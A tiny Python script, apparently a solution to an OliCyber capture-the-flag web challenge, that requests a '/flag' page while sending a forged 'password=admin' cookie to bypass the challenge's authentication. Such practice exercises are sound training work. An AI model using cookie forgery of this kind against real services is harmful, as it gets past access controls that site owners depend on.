import requests as r

print(r.get(
    'http://web-05.challs.olicyber.it/flag',
    cookies={'password': 'admin'}
    ).text)